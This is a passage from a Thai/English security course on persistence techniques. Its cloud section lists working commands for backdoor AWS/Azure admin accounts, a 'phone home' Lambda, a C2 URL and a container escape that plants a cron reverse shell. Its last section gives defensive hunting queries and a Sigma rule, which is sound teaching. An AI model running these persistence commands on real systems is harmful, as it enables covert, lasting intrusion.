            "Monitor changes to Default Domain Controllers Policy"
        ]

if __name__ == '__main__':
    ad = ActiveDirectoryPersistence()
    print("AD Persistence Techniques:")
    for tech, details in ad.AD_PERSISTENCE_TECHNIQUES.items():
        print(f"\n{tech}:")
        print(f"  Description: {details['description']}")
        print(f"  Requirements: {details.get('requirements', 'N/A')}")
        if 'persistence' in details:
            print(f"  Persistence: {details['persistence']}")
```

---

## Step 879: Cloud Persistence Techniques

เทคนิค Persistence ใน Cloud Environment

```python
from typing import Dict, List

class CloudPersistence:
    """เทคนิค persistence ในสภาพแวดล้อม Cloud"""
    
    def aws_persistence_techniques(self) -> Dict[str, str]:
        """AWS IAM-based persistence"""
        return {
            "create_backdoor_user": (
                "aws iam create-user --user-name support-admin\n"
                "aws iam attach-user-policy --user-name support-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
                "aws iam create-access-key --user-name support-admin"
            ),
            "console_access": (
                "aws iam create-login-profile --user-name support-admin --password 'P@ssw0rd!' --no-password-reset-required"
            ),
            "hidden_admin_via_policy": (
                "# Create inline policy that grants hidden admin access\n"
                "aws iam put-user-policy --user-name low-priv-user --policy-name hidden "
                "--policy-document '{\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
            ),
            "lambda_backdoor": (
                "# Create Lambda that runs periodically and phones home\n"
                "aws lambda create-function --function-name security-monitor --runtime python3.9 "
                "--role arn:aws:iam::ACCOUNT:role/role --handler index.handler "
                "--zip-file fileb://backdoor.zip\n"
                "aws events put-rule --schedule-expression 'rate(5 minutes)' --name SecurityCheck\n"
                "aws events put-targets --rule SecurityCheck --targets Id=1,Arn=arn:aws:lambda:..."
            ),
            "ssm_parameter_store": (
                "# Store C2 URLs in SSM, Lambda reads on each invocation\n"
                "aws ssm put-parameter --name /security/endpoint --value http://c2.attacker.com --type SecureString"
            )
        }
    
    def azure_persistence_techniques(self) -> Dict[str, str]:
        """Azure AD and Azure resource persistence"""
        return {
            "add_service_principal_credentials": (
                "# Add credential to existing Service Principal\n"
                "az ad sp credential reset --id <app-id> --password 'NewP@ssword' --append"
            ),
            "assign_privileged_role": (
                "# Assign Global Admin role to backdoor account\n"
                "az role assignment create --assignee backdoor@tenant.onmicrosoft.com "
                "--role 'Owner' --scope '/subscriptions/<sub-id>'"
            ),
            "automation_runbook": (
                "# Create Azure Automation Account runbook for persistence\n"
                "az automation account create --name security-automation\n"
                "az automation runbook create --name Maintenance --type Python3"
            )
        }
    
    def container_escape_to_host_persist(self) -> str:
        """Escape container and persist on host"""
        return """
# If container has privileged flag or host PID/network:

# Method 1: Mount host filesystem
mount /dev/sda1 /mnt/host
chroot /mnt/host
# Now add backdoor to /etc/cron.d/

# Method 2: Host network namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Now running in host namespace

# Method 3: Write to host's crontab via mounted hostpath
echo '*/5 * * * * root /bin/bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' >> /host/etc/cron.d/malicious
        """

if __name__ == '__main__':
    cloud = CloudPersistence()
    print("AWS Persistence Techniques:")
    for tech, cmd in cloud.aws_persistence_techniques().items():
        print(f"\n  {tech}:\n    {cmd[:100]}...")
    print("\nAzure Persistence Techniques:")
    for tech, cmd in cloud.azure_persistence_techniques().items():
        print(f"  {tech}: {cmd[:80]}...")
```

---

## Step 880: Persistence Detection & Hunting

การตรวจจับและล่า Persistence Mechanisms

```python
from typing import List, Dict
from datetime import datetime

class PersistenceHunting:
    """เครื่องมือสำหรับตรวจจับ persistence"""
    
    def windows_hunting_queries(self) -> Dict[str, str]:
        """Queries for hunting Windows persistence"""
        return {
            "registry_run_keys": (
                "# PowerShell - check all run keys\n"
                "$paths = @(\n"
                "    'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',\n"
                "    'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',\n"
                "    'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'\n"
                ")\n"
                "foreach($path in $paths) {\n"
                "    Get-ItemProperty $path | Select-Object PSChildName,*\n"
                "}"
            ),
            "scheduled_tasks": (
                "# PowerShell - list all scheduled tasks with actions\n"
                "Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | "
                "Select-Object TaskName,TaskPath,@{n='Action';e={$_.Actions.Execute}} | "
                "Where-Object {$_.Action -notlike '*Microsoft*'}"
            ),
            "services": (
                "# Check for new/modified services\n"
                "Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq 'Auto'} | "
                "Select Name,PathName,StartName | "
                "Where-Object {$_.PathName -notlike 'C:\\Windows\\*'}"
            ),
            "wmi_subscriptions": (
                "# List WMI permanent event subscriptions\n"
                "Get-WMIObject -Namespace root/subscription -Class __EventFilter | Select Name,Query"
            ),
            "startup_folder": (
                "# Check startup folders\n"
                "Get-ChildItem 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'\n"
                "Get-ChildItem $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            )
        }
    
    def linux_hunting_commands(self) -> List[str]:
        """Linux persistence hunting commands"""
        return [
            "# Cron jobs",
            "for user in $(cut -d: -f1 /etc/passwd); do crontab -l -u $user 2>/dev/null; done",
            "ls -la /etc/cron*",
            "",
            "# Systemd services",
            "systemctl list-unit-files --type=service | grep enabled",
            "find /etc/systemd /lib/systemd -name '*.service' -newer /etc/passwd",
            "",
            "# SSH authorized keys",
            "find / -name authorized_keys 2>/dev/null | xargs -I{} cat {}",
            "",
            "# SUID/SGID files (potential backdoors)",
            "find / -perm -4000 -o -perm -2000 2>/dev/null | sort",
            "",
            "# Recently modified files",
            "find /etc /bin /usr -mtime -7 -type f 2>/dev/null",
            "",
            "# Kernel modules",
            "lsmod | grep -v 'Module\|^[[:alpha:]]'",
            "cat /proc/modules",
            "",
            "# LD_PRELOAD hooks",
            "cat /etc/ld.so.preload",
            "cat /etc/ld.so.conf.d/*.conf"
        ]
    
    def autoruns_categories(self) -> List[str]:
        """Sysinternals Autoruns categories to review"""
        return [
            "Logon - Run keys, Startup folders",
            "Explorer - Shell extensions, Browser helper objects",
            "Internet Explorer - BHOs, Toolbar extensions",
            "Scheduled Tasks - All scheduled tasks",
            "Services - All services",
            "Drivers - Kernel drivers",
            "Codecs - Codec handlers",
            "Boot Execute - Pre-OS boot items",
            "WMI - Event subscriptions",
            "Known DLLs - DLL substitutions"
        ]
    
    def sigma_rule_persistence(self) -> str:
        """Sigma rule for detecting Registry Run Key additions"""
        return """
title: Registry Run Key Added
status: test
description: Detects addition of Run key for persistence
logsource:
    product: windows
    category: registry_add
detection:
    selection:
        EventType: CreateKey
        TargetObject|contains:
            - 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
            - 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
    filter_legitimate:
        Details|contains:
            - 'C:\\Windows\\system32\\'
            - 'C:\\Program Files\\'
    condition: selection and not filter_legitimate
falsepositives:
    - Software installations
level: medium
tags:
    - attack.persistence
    - attack.t1547.001
        """

if __name__ == '__main__':
    hunter = PersistenceHunting()
    print("Windows Hunting Queries:")
    for name, query in hunter.windows_hunting_queries().items():
        print(f"\n  [{name}]:")
        print(f"    {query[:150]}...")
    
    print("\nLinux Hunting Commands (first 5):")
    for cmd in hunter.linux_hunting_commands()[:10]:
        if cmd:
            print(f"  {cmd}")
    
    print("\nSigma Rule:")
    print(hunter.sigma_rule_persistence()[:400])
```

---

## สรุป Part 88

1. **Step 871**: Persistence fundamentals, MITRE ATT&CK matrix, selection criteria
2. **Step 872**: Windows Registry persistence - Run keys, IFEO hijacking
3. **Step 873**: WMI Event Subscription - fileless persistence via MOF
4. **Step 874**: Linux persistence - systemd, cron, LD_PRELOAD, authorized_keys
5. **Step 875**: DLL hijacking, COM Object hijacking, malicious DLL template
6. **Step 876**: Browser extension persistence - credential harvesting
7. **Step 877**: Kernel-level persistence - LKM rootkits, eBPF, bootkits
8. **Step 878**: Active Directory persistence - Golden Ticket, AdminSDHolder
9. **Step 879**: Cloud persistence - AWS IAM, Azure AD, container escape
10. **Step 880**: Persistence detection - hunting queries, Sigma rules

**เครื่องมือหลัก**: Autoruns, Sysmon, BloodHound, Sigma
